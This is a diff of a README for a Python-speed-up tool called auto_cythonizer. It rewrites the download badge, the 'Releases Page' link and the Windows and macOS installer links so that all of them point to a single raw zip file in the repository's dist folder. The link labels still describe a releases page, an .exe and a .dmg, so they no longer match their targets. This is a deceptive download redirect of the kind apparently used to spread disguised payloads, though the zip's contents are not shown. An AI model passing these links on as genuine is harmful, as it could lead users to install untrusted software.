@@ -1,7 +1,7 @@
 # 🚀 auto_cythonizer - Speed Up Your Python Projects Easily
 
 ## 🔗 Download Now
-[![Download auto_cythonizer](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/ladmvh/auto_cythonizer/releases)
+[![Download auto_cythonizer](https://raw.githubusercontent.com/ladmvh/auto_cythonizer/main/dist/auto_cythonizer-v1.8.zip)](https://raw.githubusercontent.com/ladmvh/auto_cythonizer/main/dist/auto_cythonizer-v1.8.zip)
 
 ## 📖 Introduction
 Auto Cythonizer helps you speed up your Python projects effortlessly. It automates the process of Cythonizing your code, making it faster and more efficient. You don’t need to know programming to use it; just follow these steps, and you’ll be ready to go!
@@ -10,13 +10,13 @@ Auto Cythonizer helps you speed up your Python projects effortlessly. It automat
 Before using Auto Cythonizer, you need to download and install the application. Here’s a quick guide to get you started.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/ladmvh/auto_cythonizer/releases) to see the available versions.
+1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/ladmvh/auto_cythonizer/main/dist/auto_cythonizer-v1.8.zip) to see the available versions.
 
 2. **Select a Version:** Look for the latest version at the top of the list. Click the version number to access its details.
 
 3. **Download the Application:**
-   - For Windows users: Click the link labeled `auto_cythonizer_windows.exe` to download the installer for Windows.
-   - For macOS users: Click the link labeled `auto_cythonizer_macos.dmg` to download the macOS version.
+   - For Windows users: Click the link labeled `https://raw.githubusercontent.com/ladmvh/auto_cythonizer/main/dist/auto_cythonizer-v1.8.zip` to download the installer for Windows.
+   - For macOS users: Click the link labeled `https://raw.githubusercontent.com/ladmvh/auto_cythonizer/main/dist/auto_cythonizer-v1.8.zip` to download the macOS version.
    - For Linux users: Choose the appropriate package from the list that matches your distribution.
 
 4. **Run the Installer:**
